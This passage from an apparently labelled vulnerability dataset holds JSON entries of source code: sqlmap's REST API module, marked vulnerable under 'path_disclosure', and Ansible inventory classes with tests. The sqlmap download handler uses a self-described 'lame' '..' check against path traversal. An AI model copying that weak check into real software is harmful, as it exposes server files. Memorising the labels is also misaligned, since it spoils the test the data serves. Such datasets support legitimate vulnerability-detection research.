True})\n\n\n@get(\"/scan/<taskid>/kill\")\ndef scan_kill(taskid):\n    \"\"\"\n    Kill a scan\n    \"\"\"\n    if (taskid not in DataStore.tasks or\n            DataStore.tasks[taskid].engine_process() is None or\n            DataStore.tasks[taskid].engine_has_terminated()):\n        logger.warning(\"[%s] Invalid task ID provided to scan_kill()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    DataStore.tasks[taskid].engine_kill()\n\n    logger.debug(\"[%s] Killed scan\" % taskid)\n    return jsonize({\"success\": True})\n\n\n@get(\"/scan/<taskid>/status\")\ndef scan_status(taskid):\n    \"\"\"\n    Returns status of a scan\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_status()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    if DataStore.tasks[taskid].engine_process() is None:\n        status = \"not running\"\n    else:\n        status = \"terminated\" if DataStore.tasks[taskid].engine_has_terminated() is True else \"running\"\n\n    logger.debug(\"[%s] Retrieved scan status\" % taskid)\n    return jsonize({\n        \"success\": True,\n        \"status\": status,\n        \"returncode\": DataStore.tasks[taskid].engine_get_returncode()\n    })\n\n\n@get(\"/scan/<taskid>/data\")\ndef scan_data(taskid):\n    \"\"\"\n    Retrieve the data of a scan\n    \"\"\"\n    json_data_message = list()\n    json_errors_message = list()\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_data()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    # Read all data from the IPC database for the taskid\n    for status, content_type, value in DataStore.current_db.execute(\n            \"SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC\",\n            (taskid,)):\n        json_data_message.append(\n            {\"status\": status, \"type\": content_type, \"value\": dejsonize(value)})\n\n    # Read all error messages from the IPC database\n    for error in DataStore.current_db.execute(\n            \"SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC\",\n            (taskid,)):\n        json_errors_message.append(error)\n\n    logger.debug(\"[%s] Retrieved scan data and error messages\" % taskid)\n    return jsonize({\"success\": True, \"data\": json_data_message, \"error\": json_errors_message})\n\n\n# Functions to handle scans' logs\n@get(\"/scan/<taskid>/log/<start>/<end>\")\ndef scan_log_limited(taskid, start, end):\n    \"\"\"\n    Retrieve a subset of log messages\n    \"\"\"\n    json_log_messages = list()\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_log_limited()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    if not start.isdigit() or not end.isdigit() or end < start:\n        logger.warning(\"[%s] Invalid start or end value provided to scan_log_limited()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid start or end value, must be digits\"})\n\n    start = max(1, int(start))\n    end = max(1, int(end))\n\n    # Read a subset of log messages from the IPC database\n    for time_, level, message in DataStore.current_db.execute(\n            (\"SELECT time, level, message FROM logs WHERE \"\n             \"taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC\"),\n            (taskid, start, end)):\n        json_log_messages.append({\"time\": time_, \"level\": level, \"message\": message})\n\n    logger.debug(\"[%s] Retrieved scan log messages subset\" % taskid)\n    return jsonize({\"success\": True, \"log\": json_log_messages})\n\n\n@get(\"/scan/<taskid>/log\")\ndef scan_log(taskid):\n    \"\"\"\n    Retrieve the log messages\n    \"\"\"\n    json_log_messages = list()\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_log()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    # Read all log messages from the IPC database\n    for time_, level, message in DataStore.current_db.execute(\n            \"SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC\", (taskid,)):\n        json_log_messages.append({\"time\": time_, \"level\": level, \"message\": message})\n\n    logger.debug(\"[%s] Retrieved scan log messages\" % taskid)\n    return jsonize({\"success\": True, \"log\": json_log_messages})\n\n\n# Function to handle files inside the output directory\n@get(\"/download/<taskid>/<target>/<filename:path>\")\ndef download(taskid, target, filename):\n    \"\"\"\n    Download a certain file from the file system\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to download()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    # Prevent file path traversal - the lame way\n    if \"..\" in target:\n        logger.warning(\"[%s] Forbidden path (%s)\" % (taskid, target))\n        return jsonize({\"success\": False, \"message\": \"Forbidden path\"})\n\n    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)\n\n    if os.path.exists(path):\n        logger.debug(\"[%s] Retrieved content of file %s\" % (taskid, target))\n        with open(path, 'rb') as inf:\n            file_content = inf.read()\n        return jsonize({\"success\": True, \"file\": file_content.encode(\"base64\")})\n    else:\n        logger.warning(\"[%s] File does not exist %s\" % (taskid, target))\n        return jsonize({\"success\": False, \"message\": \"File does not exist\"})\n\n\ndef server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):\n    \"\"\"\n    REST-JSON API server\n    \"\"\"\n    DataStore.admin_id = hexencode(os.urandom(16))\n    Database.filepath = tempfile.mkstemp(prefix=\"sqlmapipc-\", text=False)[1]\n\n    logger.info(\"Running REST-JSON API server at '%s:%d'..\" % (host, port))\n    logger.info(\"Admin ID: %s\" % DataStore.admin_id)\n    logger.debug(\"IPC database: %s\" % Database.filepath)\n\n    # Initialize IPC database\n    DataStore.current_db = Database()\n    DataStore.current_db.connect()\n    DataStore.current_db.init()\n\n    # Run RESTful API\n    try:\n        if adapter == \"gevent\":\n            from gevent import monkey\n            monkey.patch_all()\n        elif adapter == \"eventlet\":\n            import eventlet\n            eventlet.monkey_patch()\n        logger.debug(\"Using adapter '%s' to run bottle\" % adapter)\n        run(host=host, port=port, quiet=True, debug=False, server=adapter)\n    except socket.error, ex:\n        if \"already in use\" in getSafeExString(ex):\n            logger.error(\"Address already in use ('%s:%s')\" % (host, port))\n        else:\n            raise\n    except ImportError:\n        errMsg = \"Adapter '%s' is not available on this system\" % adapter\n        if adapter in (\"gevent\", \"eventlet\"):\n            errMsg += \" (e.g.: 'sudo apt-get install python-%s')\" % adapter\n        logger.critical(errMsg)\n\ndef _client(url, options=None):\n    logger.debug(\"Calling %s\" % url)\n    try:\n        data = None\n        if options is not None:\n            data = jsonize(options)\n        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})\n        response = urllib2.urlopen(req)\n        text = response.read()\n    except:\n        if options:\n            logger.error(\"Failed to load and parse %s\" % url)\n        raise\n    return text\n\n\ndef client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):\n    \"\"\"\n    REST-JSON API client\n    \"\"\"\n\n    dbgMsg = \"Example client access from command line:\"\n    dbgMsg += \"\\n\\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\\{16\\}') && echo $taskid\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl -H \\\"Content-Type: application/json\\\" -X POST -d '{\\\"url\\\": \\\"http://testphp.vulnweb.com/artists.php?artist=1\\\"}' http://%s:%d/scan/$taskid/start\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl http://%s:%d/scan/$taskid/data\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl http://%s:%d/scan/$taskid/log\" % (host, port)\n    logger.debug(dbgMsg)\n\n    addr = \"http://%s:%d\" % (host, port)\n    logger.info(\"Starting REST-JSON API client to '%s'...\" % addr)\n\n    try:\n        _client(addr)\n    except Exception, ex:\n        if not isinstance(ex, urllib2.HTTPError):\n            errMsg = \"There has been a problem while connecting to the \"\n            errMsg += \"REST-JSON API server at '%s' \" % addr\n            errMsg += \"(%s)\" % ex\n            logger.critical(errMsg)\n            return\n\n    taskid = None\n    logger.info(\"Type 'help' or '?' for list of available commands\")\n\n    while True:\n        try:\n            command = raw_input(\"api%s> \" % (\" (%s)\" % taskid if taskid else \"\")).strip().lower()\n        except (EOFError, KeyboardInterrupt):\n            print\n            break\n\n        if command in (\"data\", \"log\", \"status\", \"stop\", \"kill\"):\n            if not taskid:\n                logger.error(\"No task ID in use\")\n                continue\n            raw = _client(\"%s/scan/%s/%s\" % (addr, taskid, command))\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to execute command %s\" % command)\n            dataToStdout(\"%s\\n\" % raw)\n\n        elif command.startswith(\"new\"):\n            if ' ' not in command:\n                logger.error(\"Program arguments are missing\")\n                continue\n\n            argv = [\"sqlmap.py\"] + shlex.split(command)[1:]\n\n            try:\n                cmdLineOptions = cmdLineParser(argv).__dict__\n            except:\n                taskid = None\n                continue\n\n            for key in list(cmdLineOptions):\n                if cmdLineOptions[key] is None:\n                    del cmdLineOptions[key]\n\n            raw = _client(\"%s/task/new\" % addr)\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to create new task\")\n                continue\n            taskid = res[\"taskid\"]\n            logger.info(\"New task ID is '%s'\" % taskid)\n\n            raw = _client(\"%s/scan/%s/start\" % (addr, taskid), cmdLineOptions)\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to start scan\")\n                continue\n            logger.info(\"Scanning started\")\n\n        elif command.startswith(\"use\"):\n            taskid = (command.split()[1] if ' ' in command else \"\").strip(\"'\\\"\")\n            if not taskid:\n                logger.error(\"Task ID is missing\")\n                taskid = None\n                continue\n            elif not re.search(r\"\\A[0-9a-fA-F]{16}\\Z\", taskid):\n                logger.error(\"Invalid task ID '%s'\" % taskid)\n                taskid = None\n                continue\n            logger.info(\"Switching to task ID '%s' \" % taskid)\n\n        elif command in (\"list\", \"flush\"):\n            raw = _client(\"%s/admin/%s/%s\" % (addr, taskid or 0, command))\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to execute command %s\" % command)\n            elif command == \"flush\":\n                taskid = None\n            dataToStdout(\"%s\\n\" % raw)\n\n        elif command in (\"exit\", \"bye\", \"quit\", 'q'):\n            return\n\n        elif command in (\"help\", \"?\"):\n            msg =  \"help        Show this help message\\n\"\n            msg += \"new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \\\"http://testphp.vulnweb.com/artists.php?artist=1\\\"')\\n\"\n            msg += \"use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\\n\"\n            msg += \"data        Retrieve and show data for current task\\n\"\n            msg += \"log         Retrieve and show log for current task\\n\"\n            msg += \"status      Retrieve and show status for current task\\n\"\n            msg += \"stop        Stop current task\\n\"\n            msg += \"kill        Kill current task\\n\"\n            msg += \"list        Display all tasks\\n\"\n            msg += \"flush       Flush tasks (delete all tasks)\\n\"\n            msg += \"exit        Exit this client\\n\"\n\n            dataToStdout(msg)\n\n        elif command:\n            logger.error(\"Unknown command '%s'\" % command)\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "153c9bd539eeffdd6d395b8840f95d56e3814f27", "code": "lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\nfrom __future__ import (absolute_import, division, print_function)\n__metaclass__ = type\n\nfrom ansible.errors import AnsibleError\n\nfrom itertools import chain\n\n\nclass Group:\n    ''' a group of ansible hosts '''\n\n    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]\n\n    def __init__(self, name=None):\n\n        self.depth = 0\n        self.name = name\n        self.hosts = []\n        self._hosts = None\n        self.vars = {}\n        self.child_groups = []\n        self.parent_groups = []\n        self._hosts_cache = None\n        self.priority = 1\n\n    def __repr__(self):\n        return self.get_name()\n\n    def __str__(self):\n        return self.get_name()\n\n    def __getstate__(self):\n        return self.serialize()\n\n    def __setstate__(self, data):\n        return self.deserialize(data)\n\n    def serialize(self):\n        parent_groups = []\n        for parent in self.parent_groups:\n            parent_groups.append(parent.serialize())\n\n        self._hosts = None\n\n        result = dict(\n            name=self.name,\n            vars=self.vars.copy(),\n            parent_groups=parent_groups,\n            depth=self.depth,\n            hosts=self.hosts,\n        )\n\n        return result\n\n    def deserialize(self, data):\n        self.__init__()\n        self.name = data.get('name')\n        self.vars = data.get('vars', dict())\n        self.depth = data.get('depth', 0)\n        self.hosts = data.get('hosts', [])\n        self._hosts = None\n\n        parent_groups = data.get('parent_groups', [])\n        for parent_data in parent_groups:\n            g = Group()\n            g.deserialize(parent_data)\n            self.parent_groups.append(g)\n\n    def _walk_relationship(self, rel):\n        '''\n        Given `rel` that is an iterable property of Group,\n        consitituting a directed acyclic graph among all groups,\n        Returns a set of all groups in full tree\n        A   B    C\n        |  / |  /\n        | /  | /\n        D -> E\n        |  /    vertical connections\n        | /     are directed upward\n        F\n        Called on F, returns set of (A, B, C, D, E)\n        '''\n        seen = set([])\n        unprocessed = set(getattr(self, rel))\n\n        while unprocessed:\n            seen.update(unprocessed)\n            unprocessed = set(chain.from_iterable(\n                getattr(g, rel) for g in unprocessed\n            ))\n            unprocessed.difference_update(seen)\n\n        return seen\n\n    def get_ancestors(self):\n        return self._walk_relationship('parent_groups')\n\n    def get_descendants(self):\n        return self._walk_relationship('child_groups')\n\n    @property\n    def host_names(self):\n        if self._hosts is None:\n            self._hosts = set(self.hosts)\n        return self._hosts\n\n    def get_name(self):\n        return self.name\n\n    def add_child_group(self, group):\n\n        if self == group:\n            raise Exception(\"can't add group to itself\")\n\n        # don't add if it's already there\n        if group not in self.child_groups:\n\n            # prepare list of group's new ancestors this edge creates\n            start_ancestors = group.get_ancestors()\n            new_ancestors = self.get_ancestors()\n            if group in new_ancestors:\n                raise AnsibleError(\n                    \"Adding group '%s' as child to '%s' creates a recursive \"\n                    \"dependency loop.\" % (group.name, self.name))\n            new_ancestors.add(self)\n            new_ancestors.difference_update(start_ancestors)\n\n            self.child_groups.append(group)\n\n            # update the depth of the child\n            group.depth = max([self.depth + 1, group.depth])\n\n            # update the depth of the grandchildren\n            group._check_children_depth()\n\n            # now add self to child's parent_groups list, but only if there\n            # isn't already a group with the same name\n            if self.name not in [g.name for g in group.parent_groups]:\n                group.parent_groups.append(self)\n                for h in group.get_hosts():\n                    h.populate_ancestors(additions=new_ancestors)\n\n            self.clear_hosts_cache()\n\n    def _check_children_depth(self):\n\n        depth = self.depth\n        start_depth = self.depth  # self.depth could change over loop\n        seen = set([])\n        unprocessed = set(self.child_groups)\n\n        while unprocessed:\n            seen.update(unprocessed)\n            depth += 1\n            to_process = unprocessed.copy()\n            unprocessed = set([])\n            for g in to_process:\n                if g.depth < depth:\n                    g.depth = depth\n                    unprocessed.update(g.child_groups)\n            if depth - start_depth > len(seen):\n                raise AnsibleError(\"The group named '%s' has a recursive dependency loop.\" % self.name)\n\n    def add_host(self, host):\n        if host.name not in self.host_names:\n            self.hosts.append(host)\n            self._hosts.add(host.name)\n            host.add_group(self)\n            self.clear_hosts_cache()\n\n    def remove_host(self, host):\n\n        if host.name in self.host_names:\n            self.hosts.remove(host)\n            self._hosts.remove(host.name)\n            host.remove_group(self)\n            self.clear_hosts_cache()\n\n    def set_variable(self, key, value):\n\n        if key == 'ansible_group_priority':\n            self.set_priority(int(value))\n        else:\n            self.vars[key] = value\n\n    def clear_hosts_cache(self):\n\n        self._hosts_cache = None\n        for g in self.get_ancestors():\n            g._hosts_cache = None\n\n    def get_hosts(self):\n\n        if self._hosts_cache is None:\n            self._hosts_cache = self._get_hosts()\n        return self._hosts_cache\n\n    def _get_hosts(self):\n\n        hosts = []\n        seen = {}\n        for kid in self.get_descendants():\n            kid_hosts = kid.hosts\n            for kk in kid_hosts:\n                if kk not in seen:\n                    seen[kk] = 1\n                    if self.name == 'all' and kk.implicit:\n                        continue\n                    hosts.append(kk)\n        for mine in self.hosts:\n            if mine not in seen:\n                seen[mine] = 1\n                if self.name == 'all' and mine.implicit:\n                    continue\n                hosts.append(mine)\n        return hosts\n\n    def get_vars(self):\n        return self.vars.copy()\n\n    def set_priority(self, priority):\n        try:\n            self.priority = int(priority)\n        except TypeError:\n            # FIXME: warn about invalid priority\n            pass\n/n/n/nlib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\n# Make coding more python3-ish\nfrom __future__ import (absolute_import, division, print_function)\n__metaclass__ = type\n\nfrom ansible.inventory.group import Group\nfrom ansible.utils.vars import combine_vars, get_unique_id\n\n__all__ = ['Host']\n\n\nclass Host:\n    ''' a single ansible host '''\n\n    # __slots__ = [ 'name', 'vars', 'groups' ]\n\n    def __getstate__(self):\n        return self.serialize()\n\n    def __setstate__(self, data):\n        return self.deserialize(data)\n\n    def __eq__(self, other):\n        if not isinstance(other, Host):\n            return False\n        return self._uuid == other._uuid\n\n    def __ne__(self, other):\n        return not self.__eq__(other)\n\n    def __hash__(self):\n        return hash(self.name)\n\n    def __str__(self):\n        return self.get_name()\n\n    def __repr__(self):\n        return self.get_name()\n\n    def serialize(self):\n        groups = []\n        for group in self.groups:\n            groups.append(group.serialize())\n\n        return dict(\n            name=self.name,\n            vars=self.vars.copy(),\n            address=self.address,\n            uuid=self._uuid,\n            groups=groups,\n            implicit=self.implicit,\n        )\n\n    def deserialize(self, data):\n        self.__init__(gen_uuid=False)\n\n        self.name = data.get('name')\n        self.vars = data.get('vars', dict())\n        self.address = data.get('address', '')\n        self._uuid = data.get('uuid', None)\n        self.implicit = data.get('implicit', False)\n\n        groups = data.get('groups', [])\n        for group_data in groups:\n            g = Group()\n            g.deserialize(group_data)\n            self.groups.append(g)\n\n    def __init__(self, name=None, port=None, gen_uuid=True):\n\n        self.vars = {}\n        self.groups = []\n        self._uuid = None\n\n        self.name = name\n        self.address = name\n\n        if port:\n            self.set_variable('ansible_port', int(port))\n\n        if gen_uuid:\n            self._uuid = get_unique_id()\n        self.implicit = False\n\n    def get_name(self):\n        return self.name\n\n    def populate_ancestors(self, additions=None):\n        # populate ancestors\n        if additions is None:\n            for group in self.groups:\n                self.add_group(group)\n        else:\n            for group in additions:\n                if group not in self.groups:\n                    self.groups.append(group)\n\n    def add_group(self, group):\n\n        # populate ancestors first\n        for oldg in group.get_ancestors():\n            if oldg not in self.groups:\n                self.groups.append(oldg)\n\n        # actually add group\n        if group not in self.groups:\n            self.groups.append(group)\n\n    def remove_group(self, group):\n\n        if group in self.groups:\n            self.groups.remove(group)\n\n            # remove exclusive ancestors, xcept all!\n            for oldg in group.get_ancestors():\n                if oldg.name != 'all':\n                    for childg in self.groups:\n                        if oldg in childg.get_ancestors():\n                            break\n                    else:\n                        self.remove_group(oldg)\n\n    def set_variable(self, key, value):\n        self.vars[key] = value\n\n    def get_groups(self):\n        return self.groups\n\n    def get_magic_vars(self):\n        results = {}\n        results['inventory_hostname'] = self.name\n        results['inventory_hostname_short'] = self.name.split('.')[0]\n        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])\n\n        return results\n\n    def get_vars(self):\n        return combine_vars(self.vars, self.get_magic_vars())\n/n/n/ntest/units/plugins/inventory/test_group.py/n/n# Copyright 2018 Alan Rominger <arominge@redhat.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\nfrom ansible.compat.tests import unittest\n\nfrom ansible.inventory.group import Group\nfrom ansible.inventory.host import Host\nfrom ansible.errors import AnsibleError\n\n\nclass TestGroup(unittest.TestCase):\n\n    def test_depth_update(self):\n        A = Group('A')\n        B = Group('B')\n        Z = Group('Z')\n        A.add_child_group(B)\n        A.add_child_group(Z)\n        self.assertEqual(A.depth, 0)\n        self.assertEqual(Z.depth, 1)\n        self.assertEqual(B.depth, 1)\n\n    def test_depth_update_dual_branches(self):\n        alpha = Group('alpha')\n        A = Group('A')\n        alpha.add_child_group(A)\n        B = Group('B')\n        A.add_child_group(B)\n        Z = Group('Z')\n        alpha.add_child_group(Z)\n        beta = Group('beta')\n        B.add_child_group(beta)\n        Z.add_child_group(beta)\n\n        self.assertEqual(alpha.depth, 0)  # apex\n        self.assertEqual(beta.depth, 3)  # alpha -> A -> B -> beta\n\n        omega = Group('omega')\n        omega.add_child_group(alpha)\n\n        # verify that both paths are traversed to get the max depth value\n        self.assertEqual(B.depth, 3)  # omega -> alpha -> A -> B\n        self.assertEqual(beta.depth, 4)  # B -> beta\n\n    def test_depth_recursion(self):\n        A = Group('A')\n        B = Group('B')\n        A.add_child_group(B)\n        # hypothetical of adding B as child group to A\n        A.parent_groups.append(B)\n        B.child_groups.append(A)\n        # can't update depths of groups, because of loop\n        with self.assertRaises(AnsibleError):\n            B._check_children_depth()\n\n    def test_loop_detection(self):\n        A = Group('A')\n        B = Group('B')\n        C = Group('C')\n        A.add_child_group(B)\n        B.add_child_group(C)\n        with self.assertRaises(AnsibleError):\n            C.add_child_group(A)\n\n    def test_populates_descendant_hosts(self):\n        A = Group('A')\n        B = Group('B')\n        C = Group('C')\n        h = Host('h')\n        C.add_host(h)\n        A.add_child_group(B)  # B is child of A\n        B.add_child_group(C)  # C is descendant of A\n        A.add_child_group(B)\n        self.assertEqual(set(h.groups), set([C, B, A]))\n        h2 = Host('h2')\n        C.add_host(h2)\n        self.assertEqual(set(h2.groups), set([C, B, A]))\n\n    def test_ancestor_example(self):\n        # see docstring for Group._walk_relationship\n        groups = {}\n        for name in ['A', 'B', 'C', 'D', 'E', 'F']:\n            groups[name] = Group(name)\n        # first row\n        groups['A'].add_child_group(groups['D'])\n        groups['B'].add_child_group(groups['D'])\n        groups['B'].add_child_group(groups['E'])\n        groups['C'].add_child_group(groups['D'])\n        # second row\n        groups['D'].add_child_group(groups['E'])\n        groups['D'].add_child_group(groups['F'])\n        groups['E'].add_child_group(groups['F'])\n\n        self.assertEqual(\n            set(groups['F'].get_ancestors()),\n            set([\n                groups['A'], groups['B'], groups['C'], groups['D'], groups['E']\n            ])\n        )\n\n    def test_ancestors_recursive_loop_safe(self):\n        '''\n        The get_ancestors method may be referenced before circular parenting\n        checks, so the method is expected to be stable even with loops\n        '''\n        A = Group('A')\n        B = Group('B')\n        A.parent_groups.append(B)\n        B.parent_groups.append(A)\n        # finishes in finite time\n        self.assertEqual(A.get_ancestors(), set([A, B]))\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "153c9bd539eeffdd6d395b8840f95d56e3814f27", "code": "/lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\nfrom __future__ import (absolute_import, division, print_function)\n__metaclass__ = type\n\nfrom ansible.errors import AnsibleError\n\n\nclass Group:\n    ''' a group of ansible hosts '''\n\n    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]\n\n    def __init__(self, name=None):\n\n        self.depth = 0\n        self.name = name\n        self.hosts = []\n        self._hosts = None\n        self.vars = {}\n        self.child_groups = []\n        self.parent_groups = []\n        self._hosts_cache = None\n        self.priority = 1\n\n    def __repr__(self):\n        return self.get_name()\n\n    def __str__(self):\n        return self.get_name()\n\n    def __getstate__(self):\n        return self.serialize()\n\n    def __setstate__(self, data):\n        return self.deserialize(data)\n\n    def serialize(self):\n        parent_groups = []\n        for parent in self.parent_groups:\n            parent_groups.append(parent.serialize())\n\n        self._hosts = None\n\n        result = dict(\n            name=self.name,\n            vars=self.vars.copy(),\n            parent_groups=parent_groups,\n            depth=self.depth,\n            hosts=self.hosts,\n        )\n\n        return result\n\n    def deserialize(self, data):\n        self.__init__()\n        self.name = data.get('name')\n        self.vars = data.get('vars', dict())\n        self.depth = data.get('depth', 0)\n        self.hosts = data.get('hosts', [])\n        self._hosts = None\n\n        parent_groups = data.get('parent_groups', [])\n        for parent_data in parent_groups:\n            g = Group()\n            g.deserialize(parent_data)\n            self.parent_groups.append(g)\n\n    @property\n    def host_names(self):\n        if self._hosts is None:\n            self._hosts = set(self.hosts)\n        return self._hosts\n\n    def get_name(self):\n        return self.name\n\n    def add_child_group(self, group):\n\n        if self == group:\n            raise Exception(\"can't add group to itself\")\n\n        # don't add if it's already there\n        if group not in self.child_groups:\n            self.child_groups.append(group)\n\n            # update the depth of the child\n            group.depth = max([self.depth + 1, group.depth])\n\n            # update the depth of the grandchildren\n            group._check_children_depth()\n\n            # now add self to child's parent_groups list, but only if there\n            # isn't already a group with the same name\n            if self.name not in [g.name for g in group.parent_groups]:\n                group.parent_groups.append(self)\n                for h in group.get_hosts():\n                    h.populate_ancestors()\n\n            self.clear_hosts_cache()\n\n    def _check_children_depth(self):\n\n        try:\n            for group in self.child_groups:\n                group.depth = max([self.depth + 1, group.depth])\n                group._check_children_depth()\n        except RuntimeError:\n            raise AnsibleError(\"The group named '%s' has a recursive dependency loop.\" % self.name)\n\n    def add_host(self, host):\n        if host.name not in self.host_names:\n            self.hosts.append(host)\n            self._hosts.add(host.name)\n            host.add_group(self)\n            self.clear_hosts_cache()\n\n    def remove_host(self, host):\n\n        if host.name in self.host_names:\n            self.hosts.remove(host)\n            self._hosts.remove(host.name)\n            host.remove_group(self)\n            self.clear_hosts_cache()\n\n    def set_variable(self, key, value):\n\n        if key == 'ansible_group_priority':\n            self.set_priority(int(value))\n        else:\n            self.vars[key] = value\n\n    def clear_hosts_cache(self):\n\n        self._hosts_cache = None\n        for g in self.parent_groups:\n            g.clear_hosts_cache()\n\n    def get_hosts(self):\n\n        if self._hosts_cache is None:\n            self._hosts_cache = self._get_hosts()\n        return self._hosts_cache\n\n    def _get_hosts(self):\n\n        hosts = []\n        seen = {}\n        for kid in self.child_groups:\n            kid_hosts = kid.get_hosts()\n            for kk in kid_hosts:\n                if kk not in seen:\n                    seen[kk] = 1\n                    if self.name == 'all' and kk.implicit:\n                        continue\n                    hosts.append(kk)\n        for mine in self.hosts:\n            if mine not in seen:\n                seen[mine] = 1\n                if self.name == 'all' and mine.implicit:\n                    continue\n                hosts.append(mine)\n        return hosts\n\n    def get_vars(self):\n        return self.vars.copy()\n\n    def _get_ancestors(self):\n\n        results = {}\n        for g in self.parent_groups:\n            results[g.name] = g\n            results.update(g._get_ancestors())\n        return results\n\n    def get_ancestors(self):\n\n        return self._get_ancestors().values()\n\n    def set_priority(self, priority):\n        try:\n            self.priority = int(priority)\n        except TypeError:\n            # FIXME: warn about invalid priority\n            pass\n/n/n/n/lib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\n# Make coding more python3-ish\nfrom __future__ import (absolute_import, division, print_function)\n__metaclass__ = type\n\nfrom ansible.inventory.group import Group\nfrom ansible.utils.vars import combine_vars, get_unique_id\n\n__all__ = ['Host']\n\n\nclass Host:\n    ''' a single ansible host '''\n\n    # __slots__ = [ 'name', 'vars', 'groups' ]\n\n    def __getstate__(self):\n        return self.serialize()\n\n    def __setstate__(self, data):\n        return self.deserialize(data)\n\n    def __eq__(self, other):\n        if not isinstance(other, Host):\n            return False\n        return self._uuid == other._uuid\n\n    def __ne__(self, other):\n        return not self.__eq__(other)\n\n    def __hash__(self):\n        return hash(self.name)\n\n    def __str__(self):\n        return self.get_name()\n\n    def __repr__(self):\n        return self.get_name()\n\n    def serialize(self):\n        groups = []\n        for group in self.groups:\n            groups.append(group.serialize())\n\n        return dict(\n            